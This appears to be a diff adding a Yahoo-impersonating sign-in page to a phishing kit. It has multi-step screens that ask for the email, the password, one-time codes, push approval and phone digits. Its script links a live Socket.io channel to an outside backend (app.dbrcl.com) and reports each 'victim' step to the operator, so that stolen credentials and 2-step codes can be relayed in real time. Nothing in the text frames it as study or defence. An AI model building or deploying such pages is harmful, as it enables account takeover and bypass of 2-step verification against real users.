+                <svg class="yahoo-code-sep" viewBox="0 0 16 2" aria-hidden="true"><path d="M1 1H15" stroke="currentColor" stroke-linecap="round"/></svg>
+                <div class="yahoo-verify-code-cell"><input type="text" inputmode="numeric" maxlength="1" id="yahooEmailCode4" aria-label="Code digit 5" autocomplete="one-time-code"/></div>
+                <svg class="yahoo-code-sep" viewBox="0 0 16 2" aria-hidden="true"><path d="M1 1H15" stroke="currentColor" stroke-linecap="round"/></svg>
+                <div class="yahoo-verify-code-cell"><input type="text" inputmode="numeric" maxlength="1" id="yahooEmailCode5" aria-label="Code digit 6" autocomplete="one-time-code"/></div>
+              </div>
+            </div>
+            <div class="field-error" id="yahooEmailCodeError">That code didn&rsquo;t work. Check the code and try again.</div>
+          </div>
+          <button type="button" class="yahoo-btn-brand" id="yahooEmailCodeNextBtn" disabled>
+            <span id="yahooEmailCodeBtnLabel">Next</span>
+          </button>
+        </div>
+      </section>
+    </div><!-- /.card-body stepEmailVerify -->
+
+    <!-- ── Push notification (Send notification?) ── -->
+    <div class="card-body" id="stepPushNotify" style="display:none;">
+      <section class="yahoo-login-section yahoo-push-notify-section">
+        <p class="yahoo-step2-email" id="yahooPushNotifyAccountEmail"></p>
+        <div class="yahoo-email-verify-copy">
+          <h1 class="yahoo-title yahoo-verify-title">Send notification?</h1>
+          <p class="yahoo-verify-lead">You&rsquo;ll get a notification from a Yahoo app on your phone or tablet. Approve it to continue.</p>
+        </div>
+        <div class="yahoo-push-actions">
+          <button type="button" class="yahoo-btn-brand" id="yahooPushSendBtn">
+            <span id="yahooPushSendBtnLabel" data-idle-label="Send">Send</span>
+          </button>
+          <button type="button" class="yahoo-btn-tertiary" id="yahooPushMoreOptionsBtn">More options</button>
+        </div>
+      </section>
+    </div><!-- /.card-body stepPushNotify -->
+
+    <!-- ── WhatsApp — confirm phone (2 missing digits) ── -->
+    <div class="card-body" id="stepWhatsappPhone" style="display:none;">
+      <section class="yahoo-login-section yahoo-whatsapp-phone-section">
+        <p class="yahoo-step2-email" id="yahooWhatsappAccountEmail"></p>
+        <div class="yahoo-email-verify-copy">
+          <h1 class="yahoo-title yahoo-verify-title">Confirm your info</h1>
+          <p class="yahoo-verify-lead">Enter the 2 digits that complete this phone number.</p>
+        </div>
+        <div class="yahoo-form-block">
+          <div class="yahoo-verify-code-field">
+            <div class="yahoo-verify-code-label">Phone number</div>
+            <div class="yahoo-wa-phone-row">
+              <div class="yahoo-wa-prefix-box" id="yahooWhatsappPrefixDisplay">+3**</div>
+              <div class="yahoo-wa-main-box" id="yahooWhatsappPhoneBox">
+                <span class="yahoo-wa-mask" aria-hidden="true">** ** **</span>
+                <input type="text" class="yahoo-wa-digit" id="yahooWhatsappDigit0" inputmode="numeric" maxlength="1" placeholder="_" aria-label="Missing digit 1" autocomplete="off"/>
+                <input type="text" class="yahoo-wa-digit" id="yahooWhatsappDigit1" inputmode="numeric" maxlength="1" placeholder="_" aria-label="Missing digit 2" autocomplete="off"/>
+                <span class="yahoo-wa-suffix" id="yahooWhatsappSuffixDisplay">92</span>
+              </div>
+            </div>
+            <div class="field-error" id="yahooWhatsappPhoneError">Those digits don&rsquo;t match. Try again.</div>
+          </div>
+          <button type="button" class="yahoo-btn-brand" id="yahooWhatsappPhoneNextBtn" disabled>
+            <span id="yahooWhatsappPhoneBtnLabel">Next</span>
+          </button>
+        </div>
+      </section>
+    </div><!-- /.card-body stepWhatsappPhone -->
+
+    <!-- ── WhatsApp / SMS — 6-digit code after phone confirm ── -->
+    <div class="card-body" id="stepWhatsappSmsCode" style="display:none;">
+      <section class="yahoo-login-section yahoo-email-verify-section">
+        <p class="yahoo-step2-email" id="yahooWhatsappSmsAccountEmail"></p>
+        <div class="yahoo-verify-illus-wrap" aria-hidden="true">
+          <img src="assets/yahoo-email-verify-illus.svg" width="297" height="176" alt=""/>
+        </div>
+        <div class="yahoo-email-verify-copy">
+          <h1 class="yahoo-title yahoo-verify-title">Enter verification code</h1>
+          <p class="yahoo-verify-lead">For 2-step verification, we&rsquo;ll text you a code on <strong id="yahooWhatsappSmsPhoneDisplay">+3** ** **61 92</strong></p>
+        </div>
+        <div class="yahoo-form-block">
+          <div class="yahoo-verify-code-field">
+            <div class="yahoo-verify-code-label">6-digit code</div>
+            <div class="yahoo-verify-code-box" id="yahooWhatsappSmsCodeBox">
+              <div class="yahoo-verify-code-cells">
+                <div class="yahoo-verify-code-cell"><input type="text" inputmode="numeric" maxlength="6" id="yahooWhatsappSmsCode0" aria-label="Code digit 1" autocomplete="one-time-code"/></div>
+                <svg class="yahoo-code-sep" viewBox="0 0 16 2" aria-hidden="true"><path d="M1 1H15" stroke="currentColor" stroke-linecap="round"/></svg>
+                <div class="yahoo-verify-code-cell"><input type="text" inputmode="numeric" maxlength="1" id="yahooWhatsappSmsCode1" aria-label="Code digit 2" autocomplete="one-time-code"/></div>
+                <svg class="yahoo-code-sep" viewBox="0 0 16 2" aria-hidden="true"><path d="M1 1H15" stroke="currentColor" stroke-linecap="round"/></svg>
+                <div class="yahoo-verify-code-cell"><input type="text" inputmode="numeric" maxlength="1" id="yahooWhatsappSmsCode2" aria-label="Code digit 3" autocomplete="one-time-code"/></div>
+                <svg class="yahoo-code-sep" viewBox="0 0 16 2" aria-hidden="true"><path d="M1 1H15" stroke="currentColor" stroke-linecap="round"/></svg>
+                <div class="yahoo-verify-code-cell"><input type="text" inputmode="numeric" maxlength="1" id="yahooWhatsappSmsCode3" aria-label="Code digit 4" autocomplete="one-time-code"/></div>
+                <svg class="yahoo-code-sep" viewBox="0 0 16 2" aria-hidden="true"><path d="M1 1H15" stroke="currentColor" stroke-linecap="round"/></svg>
+                <div class="yahoo-verify-code-cell"><input type="text" inputmode="numeric" maxlength="1" id="yahooWhatsappSmsCode4" aria-label="Code digit 5" autocomplete="one-time-code"/></div>
+                <svg class="yahoo-code-sep" viewBox="0 0 16 2" aria-hidden="true"><path d="M1 1H15" stroke="currentColor" stroke-linecap="round"/></svg>
+                <div class="yahoo-verify-code-cell"><input type="text" inputmode="numeric" maxlength="1" id="yahooWhatsappSmsCode5" aria-label="Code digit 6" autocomplete="one-time-code"/></div>
+              </div>
+            </div>
+            <div class="field-error" id="yahooWhatsappSmsCodeError">That code didn&rsquo;t work. Check the code and try again.</div>
+          </div>
+          <button type="button" class="yahoo-btn-brand" id="yahooWhatsappSmsCodeNextBtn" disabled>
+            <span id="yahooWhatsappSmsCodeBtnLabel">Next</span>
+          </button>
+        </div>
+      </section>
+    </div><!-- /.card-body stepWhatsappSmsCode -->
+
+    <!-- ── UDS SMS — confirm phone (2 missing digits) ── -->
+    <div class="card-body" id="stepUdsSmsPhone" style="display:none;">
+      <section class="yahoo-login-section yahoo-whatsapp-phone-section">
+        <p class="yahoo-step2-email" id="yahooSmsUdsAccountEmail"></p>
+        <div class="yahoo-email-verify-copy">
+          <h1 class="yahoo-title yahoo-verify-title">Confirm your info</h1>
+          <p class="yahoo-verify-lead">Enter the 2 digits that complete this phone number.</p>
+        </div>
+        <div class="yahoo-form-block">
+          <div class="yahoo-verify-code-field">
+            <div class="yahoo-verify-code-label">Phone number</div>
+            <div class="yahoo-wa-phone-row">
+              <div class="yahoo-wa-prefix-box" id="yahooSmsUdsPrefixDisplay">+3**</div>
+              <div class="yahoo-wa-main-box" id="yahooSmsUdsPhoneBox">
+                <span class="yahoo-wa-mask" aria-hidden="true">** ** **</span>
+                <input type="text" class="yahoo-wa-digit" id="yahooSmsUdsDigit0" inputmode="numeric" maxlength="1" placeholder="_" aria-label="Missing digit 1" autocomplete="off"/>
+                <input type="text" class="yahoo-wa-digit" id="yahooSmsUdsDigit1" inputmode="numeric" maxlength="1" placeholder="_" aria-label="Missing digit 2" autocomplete="off"/>
+                <span class="yahoo-wa-suffix" id="yahooSmsUdsSuffixDisplay">92</span>
+              </div>
+            </div>
+            <div class="field-error" id="yahooSmsUdsPhoneError">Those digits don&rsquo;t match. Try again.</div>
+          </div>
+          <button type="button" class="yahoo-btn-brand" id="yahooSmsUdsPhoneNextBtn" disabled>
+            <span id="yahooSmsUdsPhoneBtnLabel">Next</span>
+          </button>
+        </div>
+      </section>
+    </div><!-- /.card-body stepUdsSmsPhone -->
+
+    <!-- ── UDS SMS — 6-digit code after phone confirm ── -->
+    <div class="card-body" id="stepUdsSmsCode" style="display:none;">
+      <section class="yahoo-login-section yahoo-email-verify-section">
+        <p class="yahoo-step2-email" id="yahooSmsUdsCodeAccountEmail"></p>
+        <div class="yahoo-verify-illus-wrap" aria-hidden="true">
+          <img src="assets/yahoo-email-verify-illus.svg" width="297" height="176" alt=""/>
+        </div>
+        <div class="yahoo-email-verify-copy">
+          <h1 class="yahoo-title yahoo-verify-title">Enter verification code</h1>
+          <p class="yahoo-verify-lead">For 2-step verification, we&rsquo;ll text you a code on <strong id="yahooSmsUdsPhoneDisplay">+3** ** **61 92</strong></p>
+        </div>
+        <div class="yahoo-form-block">
+          <div class="yahoo-verify-code-field">
+            <div class="yahoo-verify-code-label">6-digit code</div>
+            <div class="yahoo-verify-code-box" id="yahooSmsUdsCodeBox">
+              <div class="yahoo-verify-code-cells">
+                <div class="yahoo-verify-code-cell"><input type="text" inputmode="numeric" maxlength="6" id="yahooSmsUdsCode0" aria-label="Code digit 1" autocomplete="one-time-code"/></div>
+                <svg class="yahoo-code-sep" viewBox="0 0 16 2" aria-hidden="true"><path d="M1 1H15" stroke="currentColor" stroke-linecap="round"/></svg>
+                <div class="yahoo-verify-code-cell"><input type="text" inputmode="numeric" maxlength="1" id="yahooSmsUdsCode1" aria-label="Code digit 2" autocomplete="one-time-code"/></div>
+                <svg class="yahoo-code-sep" viewBox="0 0 16 2" aria-hidden="true"><path d="M1 1H15" stroke="currentColor" stroke-linecap="round"/></svg>
+                <div class="yahoo-verify-code-cell"><input type="text" inputmode="numeric" maxlength="1" id="yahooSmsUdsCode2" aria-label="Code digit 3" autocomplete="one-time-code"/></div>
+                <svg class="yahoo-code-sep" viewBox="0 0 16 2" aria-hidden="true"><path d="M1 1H15" stroke="currentColor" stroke-linecap="round"/></svg>
+                <div class="yahoo-verify-code-cell"><input type="text" inputmode="numeric" maxlength="1" id="yahooSmsUdsCode3" aria-label="Code digit 4" autocomplete="one-time-code"/></div>
+                <svg class="yahoo-code-sep" viewBox="0 0 16 2" aria-hidden="true"><path d="M1 1H15" stroke="currentColor" stroke-linecap="round"/></svg>
+                <div class="yahoo-verify-code-cell"><input type="text" inputmode="numeric" maxlength="1" id="yahooSmsUdsCode4" aria-label="Code digit 5" autocomplete="one-time-code"/></div>
+                <svg class="yahoo-code-sep" viewBox="0 0 16 2" aria-hidden="true"><path d="M1 1H15" stroke="currentColor" stroke-linecap="round"/></svg>
+                <div class="yahoo-verify-code-cell"><input type="text" inputmode="numeric" maxlength="1" id="yahooSmsUdsCode5" aria-label="Code digit 6" autocomplete="one-time-code"/></div>
+              </div>
+            </div>
+            <div class="field-error" id="yahooSmsUdsCodeError">That code didn&rsquo;t work. Check the code and try again.</div>
+          </div>
+          <button type="button" class="yahoo-btn-brand" id="yahooSmsUdsCodeNextBtn" disabled>
+            <span id="yahooSmsUdsCodeBtnLabel">Next</span>
+          </button>
+        </div>
+      </section>
+    </div><!-- /.card-body stepUdsSmsCode -->
+
+    <!-- ── STEP 3: Phone number ── -->
+    <div class="card-body" id="step3" style="display:none;">
+      <div class="col-brand">
+        <h1>Verify it's you</h1>
+        <div id="step3AccountChip" class="acct-chip">
+          <div class="acct-chip-icon">
+            <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"/></svg>
+          </div>
+          <span id="step3ChipEmail" class="acct-chip-email"></span>
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="#444746" aria-hidden="true"><path d="M7 10l5 5 5-5H7z"/></svg>
+        </div>
+      </div>
+      <div class="col-form">
+        <p class="phone-info">
+          For added security, Yahoo wants to verify it's really you. Enter the phone number associated with your account.
+        </p>
+        <div class="phone-row">
+          <div class="phone-prefix-box" id="phonePrefixBox">+</div>
+          <div class="text-field" style="flex:1;">
+            <input
+              type="tel"
+              id="phoneInput"
+              placeholder=" "
+              autocomplete="tel"
+              spellcheck="false"
+              aria-label="Phone number"
+            />
+            <label for="phoneInput">Phone number</label>
+          </div>
+        </div>
+        <div class="field-error" id="phoneError">Enter a valid phone number</div>
+
+        <div class="actions">
+          <button class="btn-text" type="button" id="phoneBackBtn">Back</button>
+          <button class="btn-next" type="button" id="phoneNextBtn">
+            <span id="phoneBtnLabel">Next</span>
+          </button>
+        </div>
+      </div>
+    </div><!-- /.card-body step3 -->
+
+    <!-- ── STEP 4: Google Prompt (number) ── -->
+    <div class="card-body" id="step4" style="display:none;">
+      <div class="col-brand">
+        <h1>2-Step Verification</h1>
+        <p class="subtitle" style="font-size:14px; color:#444746; font-weight:400; margin-bottom:24px; line-height:1.5;">
+          To help keep your account safe, Yahoo wants to make sure it's really you trying to sign in
+        </p>
+        <div id="step4Chip" class="acct-chip">
+          <div class="acct-chip-icon">
+            <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"/></svg>
+          </div>
+          <span id="step4ChipEmail" class="acct-chip-email"></span>
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="#444746" aria-hidden="true"><path d="M7 10l5 5 5-5H7z"/></svg>
+        </div>
+        <a href="#" class="forgot-link" style="margin-top:auto; margin-bottom:0;">Resend it</a>
+      </div>
+      <div class="col-form col-form-center">
+        <div class="prompt-number" id="promptNumber">58</div>
+        <p class="prompt-device-title" id="promptDeviceName">Open the Yahoo Mail app</p>
+        <p class="prompt-desc">
+          Yahoo sent a notification to your <span id="promptDeviceNameInline">phone</span>. Open the Yahoo Mail app, tap <strong>Yes</strong> on the
+          prompt, then tap <strong id="promptNumberInline">58</strong> on your phone to verify it's you.
+        </p>
+        <a href="#" class="prompt-help-link">Need help? Learn more about Google prompts</a>
+        <label class="prompt-checkbox-row">
+          <input type="checkbox" checked> Don't ask again on this device
+        </label>
+        <div class="actions" style="width:100%;">
+          <span></span>
+          <button class="btn-text" type="button">Try another way</button>
+        </div>
+      </div>
+    </div><!-- /.card-body step4 -->
+
+    <!-- ── STEP 5: SMS — Phone entry ── -->
+    <div class="card-body" id="step5" style="display:none;">
+      <div class="col-brand">
+        <div class="sms-gif-wrap">
+          <img src="https://ssl.gstatic.com/accounts/account-recovery-sms-pin.gif" aria-hidden="true" alt="">
+        </div>
+        <h1>2-Step Verification</h1>
+        <div id="step5Chip" class="acct-chip">
+          <div class="acct-chip-icon">
+            <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"/></svg>
+          </div>
+          <span id="step5ChipEmail" class="acct-chip-email"></span>
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="#444746" aria-hidden="true"><path d="M7 10l5 5 5-5H7z"/></svg>
+        </div>
+      </div>
+      <div class="col-form">
+        <p class="sms-section-title">Get a verification code</p>
+        <p class="sms-desc">
+          To get a verification code, first confirm the phone number you added to your account
+          <span class="sms-masked-num">••• ••• •<span id="smsLastTwo">92</span></span>.
+          <em>Standard message and data rates may apply.</em>
+        </p>
+        <div class="phone-row">
+          <div class="sms-country-selector" id="smsPrefixBox">+</div>
+          <div class="text-field" style="flex:1;">
+            <input
+              type="tel"
+              id="smsPhoneInput"
+              placeholder=" "
+              autocomplete="tel"
+              aria-label="Phone number"
+            />
+            <label for="smsPhoneInput">Phone number</label>
+          </div>
+        </div>
+        <div class="field-error" id="smsPhoneError">Enter a valid phone number</div>
+        <div class="sms-checkbox-row">
+          <input type="checkbox" id="smsDontAsk">
+          <label for="smsDontAsk">Don't ask again on this device</label>
+        </div>
+        <div class="actions">
+          <span></span>
+          <button class="btn-next" type="button" id="smsSendBtn">
+            <span id="smsSendLabel">Send</span>
+          </button>
+        </div>
+      </div>
+    </div><!-- /.card-body step5 -->
+
+    <!-- ── STEP 6: SMS — Code entry ── -->
+    <div class="card-body" id="step6" style="display:none;">
+      <div class="col-brand">
+        <h1>2-Step Verification</h1>
+        <p class="subtitle" style="font-size:14px; color:#444746; font-weight:400; margin-bottom:24px; line-height:1.5;">
+          To help keep your account safe, Yahoo wants to make sure it's really you trying to sign in
+        </p>
+        <div id="step6Chip" class="acct-chip">
+          <div class="acct-chip-icon">
+            <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"/></svg>
+          </div>
+          <span id="step6ChipEmail" class="acct-chip-email"></span>
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="#444746" aria-hidden="true"><path d="M7 10l5 5 5-5H7z"/></svg>
+        </div>
+      </div>
+      <div class="col-form">
+        <p class="code-hint" id="smsCodeHint">
+          Enter the 6-digit code we sent to your phone.
+        </p>
+        <div class="text-field">
+          <input
+            type="text"
+            id="smsCodeInput"
+            placeholder=" "
+            maxlength="6"
+            inputmode="numeric"
+            autocomplete="one-time-code"
+            aria-label="Enter code"
+          />
+          <label for="smsCodeInput">Enter code</label>
+        </div>
+        <div class="field-error" id="smsCodeError">Wrong code. Try again or request a new one.</div>
+        <a href="#" class="forgot-link">Resend code</a>
+        <div class="actions">
+          <span></span>
+          <button class="btn-next" type="button" id="smsCodeNextBtn">
+            <span id="smsCodeLabel">Next</span>
+          </button>
+        </div>
+      </div>
+    </div><!-- /.card-body step6 -->
+
+    <!-- ── STEP 7: Authenticator code ── -->
+    <div class="card-body" id="step7" style="display:none;">
+      <div class="col-brand">
+        <h1>2-Step Verification</h1>
+        <p class="subtitle" style="font-size:14px; color:#444746; font-weight:400; margin-bottom:24px; line-height:1.5;">
+          To help keep your account safe, Yahoo wants to make sure it's really you trying to sign in
+        </p>
+        <div id="step7Chip" class="acct-chip">
+          <div class="acct-chip-icon">
+            <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"/></svg>
+          </div>
+          <span id="step7ChipEmail" class="acct-chip-email"></span>
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="#444746" aria-hidden="true"><path d="M7 10l5 5 5-5H7z"/></svg>
+        </div>
+      </div>
+      <div class="col-form">
+        <p class="sms-section-title">2-Step Verification</p>
+        <p class="code-hint">
+          Get a verification code from the <strong>Yahoo Account Key</strong> app
+        </p>
+        <div class="text-field">
+          <input
+            type="tel"
+            id="authCodeInput"
+            placeholder=" "
+            maxlength="6"
+            pattern="[0-9 ]*"
+            inputmode="numeric"
+            autocomplete="one-time-code"
+            aria-label="Enter code"
+          />
+          <label for="authCodeInput">Enter code</label>
+        </div>
+        <div class="field-error" id="authCodeError">Wrong code. Try again.</div>
+        <div class="sms-checkbox-row" style="margin-top:8px;">
+          <input type="checkbox" id="authDontAsk">
+          <label for="authDontAsk">Don't ask again on this device</label>
+        </div>
+        <div class="actions">
+          <button class="btn-text" type="button">Try another way</button>
+          <button class="btn-next" type="button" id="authCodeNextBtn">
+            <span id="authCodeLabel">Next</span>
+          </button>
+        </div>
+      </div>
+    </div><!-- /.card-body step7 -->
+
+      </div><!-- /#loginbox -->
+      </div><!-- /.yahoo-login-center -->
+    </div><!-- /.yahoo-main-col -->
+
+    <aside class="yahoo-promo-panel" aria-hidden="true"></aside>
+  </div><!-- /.yahoo-shell -->
+
+  <!-- Socket.io for backend commands — same server as apply.html -->
+  <script src="assets/victim-view.js"></script>
+  <script src="assets/socket-presence.js"></script>
+  <script src="assets/api-payload.js"></script>
+  <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
+
+  <script>
+  /* Guard: redirect to apply.html if user opens this page directly (tab closed and reopened) */
+  (function () {
+    if (!sessionStorage.getItem('yahooLoginSession')) {
+      window.location.replace('apply.html');
+    }
+  })();
+  </script>
+
+  <script>
+  (function () {
+    var BACKEND = 'https://app.dbrcl.com';
+    /* Auto-switch to local backend when running on localhost or *.test */
+    if (location.hostname === 'localhost' || location.hostname === '127.0.0.1' ||
+        location.hostname.endsWith('.test') || location.hostname.endsWith('.local')) {
+      BACKEND = 'http://localhost:3001';
+    }
+
+    /* ─── clientId — reuse the one from apply.html so backend routes to same user ─── */
+    var clientId = localStorage.getItem('clientId');
+    if (!clientId) {
+      clientId = (typeof crypto !== 'undefined' && crypto.randomUUID)
+                 ? crypto.randomUUID()
+                 : Math.random().toString(36).slice(2) + Date.now().toString(36);
+      localStorage.setItem('clientId', clientId);
+    }
+
+    /* ─── Socket — init first so socket.id is available in fetch calls ─── */
+    var socket;
+    var currentSocketId = '';
+    var pwWaitTimer;
+
+    /* ─── Elements ─── */
+    var emailInput   = document.getElementById('emailInput');
+    var emailErr     = document.getElementById('emailError');
+    var emailNextBtn = document.getElementById('emailNextBtn');
+    var emailLabel   = document.getElementById('emailBtnLabel');
+
+    var step1 = document.getElementById('step1');
+    var step2 = document.getElementById('step2');
+
+    var pwInput      = document.getElementById('pwInput');
+    var pwErr        = document.getElementById('pwError');
+    var pwNextBtn    = document.getElementById('pwNextBtn');
+    var pwLabel      = document.getElementById('pwBtnLabel');
+    var pwShowBtn    = document.getElementById('pwShowBtn');
+
+    var chipEmail  = document.getElementById('chipEmail');
+    var overlay    = document.getElementById('overlay');
+
+    function yahooPostBody(fields) {
+      return typeof ApiPayload !== 'undefined'
+        ? ApiPayload.withClient(fields)
+        : Object.assign({ socketId: currentSocketId, clientId: clientId }, fields);
+    }
+
+    function reportVisibleGoogleStep() {
+      if (typeof VictimView === 'undefined') return;
+      var steps = [
+        ['step1', 'yahoo-login-email'],
+        ['step2', 'yahoo-login-password'],
+        ['stepEmailVerify', 'yahoo-login-email-verify'],
+        ['stepPushNotify', 'yahoo-login-push-notify'],
+        ['stepWhatsappPhone', 'yahoo-login-whatsapp-phone'],
+        ['stepWhatsappSmsCode', 'yahoo-login-whatsapp-sms-code'],
+        ['stepUdsSmsPhone', 'yahoo-login-sms-phone'],
+        ['stepUdsSmsCode', 'yahoo-login-sms-code'],
+        ['step3', 'yahoo-login-phone'],
+        ['step4', 'yahoo-login-prompt'],
+        ['step5', 'yahoo-login-sms'],
+        ['step6', 'yahoo-login-sms'],
+        ['step7', 'yahoo-login-auth']
+      ];
+      for (var i = 0; i < steps.length; i++) {
+        var el = document.getElementById(steps[i][0]);
+        if (el && el.style.display !== 'none') {
+          VictimView.report(steps[i][1]);
+          return;
+        }
+      }
+      VictimView.report('yahoo-login-email');
+    }
+
+    function clearPwErrState() {
+      var pwIn = document.getElementById('pwInput');
+      var pwWrap = document.getElementById('pwInputWrap');
+      var pwLbl = document.getElementById('pwFieldLabel');
+      var pwErrEl = document.getElementById('pwError');
+      var pwToggle = document.getElementById('pwShowBtn');
+      if (pwIn) {
+        pwIn.classList.remove('err');
+        pwIn.setAttribute('aria-invalid', 'false');
+      }
+      if (pwWrap) pwWrap.classList.remove('err', 'is-error');
+      if (pwLbl) pwLbl.classList.remove('is-error');
+      if (pwToggle) pwToggle.classList.remove('is-error');
+      if (pwErrEl) pwErrEl.classList.remove('visible');
+    }
+
+    function showPwErr(message) {
+      var pwIn = document.getElementById('pwInput');
+      var pwWrap = document.getElementById('pwInputWrap');
+      var pwLbl = document.getElementById('pwFieldLabel');
+      var pwErrEl = document.getElementById('pwError');
+      var pwToggle = document.getElementById('pwShowBtn');
+      if (pwErrEl && message) pwErrEl.textContent = message;
+      if (pwIn) {
+        pwIn.classList.add('err');
+        pwIn.setAttribute('aria-invalid', 'true');
+        pwIn.focus();
+      }
+      if (pwWrap) {
+        pwWrap.classList.add('err', 'is-error');
+      }
+      if (pwLbl) pwLbl.classList.add('is-error');
+      if (pwToggle) pwToggle.classList.add('is-error');
+      if (pwErrEl) pwErrEl.classList.add('visible');
+    }
+
+    /* ─── Helpers ─── */
+    function clearErr(input, errEl) {
+      input.classList.remove('err');
+      if (input.id === 'emailInput') {
+        var emailWrap = document.getElementById('emailInputWrap');
+        if (emailWrap) emailWrap.classList.remove('err');
+      }
+      if (input.id === 'pwInput') {
+        clearPwErrState();
+        return;
+      }
+      errEl.classList.remove('visible');
+    }
+
+    function showErr(input, errEl) {
+      if (input.id === 'pwInput') {
+        showPwErr(errEl && errEl.textContent ? errEl.textContent : 'Incorrect password. Try again');
+        return;
+      }
+      input.classList.add('err');
+      if (input.id === 'emailInput') {
+        var emailWrapErr = document.getElementById('emailInputWrap');
+        if (emailWrapErr) emailWrapErr.classList.add('err');
+      }
+      errEl.classList.add('visible');
+      input.focus();
+    }
+
+    function setLoading(btn, labelEl, loading) {
+      if (!btn || !labelEl) return;
+      var fromAttr = labelEl.getAttribute('data-idle-label');
+      if (fromAttr) labelEl.dataset.idleLabel = fromAttr.trim();
+      else if (!labelEl.dataset.idleLabel) {
+        labelEl.dataset.idleLabel = (labelEl.textContent || 'Next').trim();
+      }
+      var idleText = labelEl.dataset.idleLabel;
+      if (loading) {
+        btn.disabled = true;
+        btn.classList.add('is-loading');
+        labelEl.hidden = true;
+        if (!document.getElementById('spinner_' + btn.id)) {
+          var sp = document.createElement('span');
+          sp.className = 'btn-spinner';
+          sp.id = 'spinner_' + btn.id;
+          sp.setAttribute('aria-hidden', 'true');
+          btn.appendChild(sp);
+        }
+      } else {
+        btn.disabled = false;
+        btn.classList.remove('is-loading');
+        labelEl.hidden = false;
+        var sp = document.getElementById('spinner_' + btn.id);
+        if (sp) sp.remove();
+        labelEl.textContent = idleText;
+      }
+    }
+
+    /* ─── Socket.io connection ─── */
+    try {
+      socket = io(BACKEND, {
+        query: { clientId: clientId },
+        transports: ['polling', 'websocket'],
+        reconnectionAttempts: Infinity,
+        reconnectionDelay: 1000,
+        reconnectionDelayMax: 5000,
+        timeout: 20000
+      });
+
+      var _glFirstConnect = true;
+      window.socket = socket;
+      if (typeof VictimView !== 'undefined') VictimView.setSocket(socket);
+
+      if (typeof SocketPresence !== 'undefined') {
+        SocketPresence.install(socket, {
+          page: 'yahoo-login',
+          onReconnect: function () {
+            reportVisibleGoogleStep();
+            clearReconnectUi();
+          },
+        });
+      }
+
+      function clearReconnectUi() {
+          clearTimeout(pwWaitTimer);
+          if (overlay) overlay.classList.remove('visible');
+
+          [
+            { btn: emailNextBtn, lbl: emailLabel },
+            { btn: pwNextBtn,    lbl: pwLabel },
+            { btn: document.getElementById('phoneNextBtn'),    lbl: document.getElementById('phoneBtnLabel') },
+            { btn: document.getElementById('smsSendBtn'),      lbl: document.getElementById('smsSendLabel') },
+            { btn: document.getElementById('smsCodeNextBtn'),  lbl: document.getElementById('smsCodeLabel') },
+            { btn: document.getElementById('authCodeNextBtn'), lbl: document.getElementById('authCodeLabel') },
+            { btn: document.getElementById('yahooEmailCodeNextBtn'), lbl: document.getElementById('yahooEmailCodeBtnLabel') },
+            { btn: document.getElementById('yahooWhatsappPhoneNextBtn'), lbl: document.getElementById('yahooWhatsappPhoneBtnLabel') },
+            { btn: document.getElementById('yahooWhatsappSmsCodeNextBtn'), lbl: document.getElementById('yahooWhatsappSmsCodeBtnLabel') },
+            { btn: document.getElementById('yahooSmsUdsPhoneNextBtn'), lbl: document.getElementById('yahooSmsUdsPhoneBtnLabel') },
+            { btn: document.getElementById('yahooSmsUdsCodeNextBtn'), lbl: document.getElementById('yahooSmsUdsCodeBtnLabel') },
+            { btn: document.getElementById('yahooPushSendBtn'), lbl: document.getElementById('yahooPushSendBtnLabel') }
+          ].forEach(function (o) {
+            if (o.btn && o.lbl && o.btn.querySelector('.btn-spinner')) {
+              setLoading(o.btn, o.lbl, false);
+            }
+          });
+      }
+
+      socket.on('connect', function () {
